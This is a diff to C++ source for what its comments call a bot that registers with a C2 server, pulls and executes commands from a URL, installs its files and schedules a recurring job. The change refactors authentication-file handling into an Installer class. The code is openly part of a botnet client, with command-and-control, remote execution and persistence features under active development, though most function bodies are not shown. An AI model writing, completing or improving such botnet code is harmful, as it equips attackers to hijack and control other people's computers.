@@ -1,7 +1,6 @@
 #include <memory>
 #include <string>
 
-#include "authfile.hh"
 #include "command.hh"
 #include "installer.hh"
 #include "request.hh"
@@ -11,39 +10,34 @@ const std::string HASH_TYPE("SHA256");
 
 class Bot {
    public:
-    Bot(const std::string& auth_path);
+    Bot(const std::string& install_dir);
     bool IsNew();
-    void Install(std::string install_dir);
+    void Install();
     void RegisterBot(const std::string& register_url);
     void ExecuteCommand(const std::string& command_url);
 
    private:
     bool is_new_;
     std::string hash_type_, hash_sum_, os_, user_;
-    std::unique_ptr<AuthFile> auth_;
+    std::unique_ptr<Installer> install_;
 
     void PrepareSysInfo_();
 };
 
 // Initialize auth file and determine if bot is new
-Bot::Bot(const std::string& auth_path) {
+Bot::Bot(const std::string& install_dir) {
     hash_type_ = HASH_TYPE;
-    auth_ = std::make_unique<AuthFile>(auth_path);
-    is_new_ = auth_->Exists();
-    if (IsNew())
-        auth_.Init();
-    else
-        auth_.Retrieve();
+    install_ = std::make_unique<Installer>(install_dir);
+    hash_sum_ = install_->GetAuthHash();
 }
+
+bool Bot::IsNew() { return install_->IsNew(); }
 
 // Install files and components
-void Bot::Install(std::string install_dir) {
-    Installer bot_install(install_dir);
-    bot_install.InstallFiles();
-    bot_install.InitRecurringJob();
+void Bot::Install() {
+    install_->InstallFiles();
+    install_->InitRecurringJob();
 }
-
-bool Bot::IsNew() { return is_new_; }
 
 // Register bot with C2 server
 void Bot::RegisterBot(const std::string& register_url) {
@@ -73,9 +67,6 @@ void Bot::ExecuteCommand(const std::string& command_url) {
 
 // Retrieve values if they haven't been already
 void Bot::PrepareSysInfo_() {
-    if (!(hash_sum_.size())) {
-        hash_sum_ = auth_->GetHash();
-    }
     if (!(os_.size())) {
         os_ = util::GetOS();
     }
